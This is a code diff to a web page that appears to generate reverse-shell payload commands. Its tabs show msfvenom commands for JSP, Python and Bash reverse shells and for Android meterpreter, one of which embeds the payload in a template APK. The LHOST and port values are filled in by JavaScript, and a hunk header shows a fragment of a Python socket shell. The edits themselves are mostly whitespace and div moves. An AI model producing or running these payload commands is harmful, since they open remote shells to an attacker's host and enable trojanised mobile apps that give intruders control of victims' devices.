 <div id="JSRT" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
+ <h3 class="w3-text-theme w3-large w3-display-container">  
      <div id="mydiv">
 <p> msfvenom -p java/jsp_shell_reverse_tcp &nbsp </p>
 <p>LHOST=</p>
@@ -3119,9 +3129,10 @@ stdin=sp.PIPE);c.sendall
 </div>
  
 <div id="WSRT" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-      <div id="mydiv">
+ <h3 class="w3-text-theme w3-large w3-display-container">   
+ 
 <p> msfvenom -p java/jsp_shell_reverse_tcp &nbsp </p>
+    <div id="mydiv">
 <p>LHOST=</p>
 <p id="ip thirteen"></p>
 
@@ -3136,10 +3147,11 @@ stdin=sp.PIPE);c.sendall
 </div>
 
 <div id="AMRT" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-  <div id="mydiv">
-<p> msfvenom --platform android -p android/meterpreter/reverse_tcp &nbsp
-</p>
+ <h3 class="w3-text-theme w3-large w3-display-container">   
+ 
+<p> msfvenom --platform android -p android/meterpreter/reverse_tcp &nbsp  
+</p>    
+    <div id="mydiv">
 <p>lhost=</p>
 <p id="ip fourteen"></p>
 
@@ -3152,9 +3164,9 @@ stdin=sp.PIPE);c.sendall
 
 
 <div id="AMERT" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
+ <h3 class="w3-text-theme w3-large w3-display-container">  
  <div id="mydiv">
-<p> msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp  &nbsp
+<p> msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp  &nbsp 
 </p>
 <p> lhost=</p>
 <p id="ip fifteen"></p>
@@ -3172,10 +3184,11 @@ stdin=sp.PIPE);c.sendall
 
 
 <div id="PSRT" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-  <div id="mydiv">
-<p> msfvenom -p cmd/unix/reverse_python &nbsp
+ <h3 class="w3-text-theme w3-large w3-display-container">  
+ 
+<p> msfvenom -p cmd/unix/reverse_python &nbsp 
 </p>
+    <div id="mydiv">
 <p> LHOST=</p>
 <p id="ip sixteen"></p>
 
@@ -3193,10 +3206,11 @@ stdin=sp.PIPE);c.sendall
 </div>
 
 <div id="BSRT" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
- <div id="mydiv">
-<p>msfvenom -p cmd/unix/reverse_bash &nbsp
+ <h3 class="w3-text-theme w3-large w3-display-container"> 
+ 
+<p>msfvenom -p cmd/unix/reverse_bash &nbsp 
 </p>
+    <div id="mydiv">
 <p> LHOST=</p>
 <p id="ip seventeen"></p>
 <p>
@@ -3854,7 +3868,7 @@ function secFunction() {
   let y="sudo ";
   // If x is Not a Number or less than one or greater than 10
   let text;
-  if (isNaN(x) || x<0)
+  if (isNaN(x) || x<0) 
   {
     text = " Input not valid ";
   }
@@ -3877,24 +3891,24 @@ function secFunction() {
  document.getElementById("input port").innerHTML = text;
   document.getElementById("port again").innerHTML = text;
   document.getElementById("port once again").innerHTML = text;
-    document.getElementById("port one").innerHTML = text;
-    document.getElementById("port two").innerHTML = text;
-    document.getElementById("port three").innerHTML = text;
-    document.getElementById("port four").innerHTML = text;
-    document.getElementById("port five").innerHTML = text;
-    document.getElementById("port six").innerHTML = text;
+    document.getElementById("port one").innerHTML = text; 
+    document.getElementById("port two").innerHTML = text; 
+    document.getElementById("port three").innerHTML = text; 
+    document.getElementById("port four").innerHTML = text; 
+    document.getElementById("port five").innerHTML = text; 
+    document.getElementById("port six").innerHTML = text; 
     document.getElementById("port seven").innerHTML = text;
     document.getElementById("port eight").innerHTML = text;
-    document.getElementById("port nine").innerHTML = text;
-    document.getElementById("port ten").innerHTML = text;
-    document.getElementById("port eleven").innerHTML = text;
-    document.getElementById("port twelve").innerHTML = text;
-    document.getElementById("port thirteen").innerHTML = text;
-    document.getElementById("port fourteen").innerHTML = text;
-    document.getElementById("port fifteen").innerHTML = text;
-    document.getElementById("port sixteen").innerHTML = text;
-    document.getElementById("port seventeen").innerHTML = text;
-    document.getElementById("port eighteen").innerHTML = text;
+    document.getElementById("port nine").innerHTML = text; 
+    document.getElementById("port ten").innerHTML = text;  
+    document.getElementById("port eleven").innerHTML = text; 
+    document.getElementById("port twelve").innerHTML = text; 
+    document.getElementById("port thirteen").innerHTML = text; 
+    document.getElementById("port fourteen").innerHTML = text; 
+    document.getElementById("port fifteen").innerHTML = text; 
+    document.getElementById("port sixteen").innerHTML = text; 
+    document.getElementById("port seventeen").innerHTML = text;  
+    document.getElementById("port eighteen").innerHTML = text;      
        document.getElementById("port nineteen").innerHTML = text;
                    
                       document.getElementById("port twenty").innerHTML = text;
@@ -3962,10 +3976,9 @@ document.getElementById("port fifty five").innerHTML = text;
 }
 
 
-</script>
+</script> 
 </script>
 
 </body>
 </html>
-
 
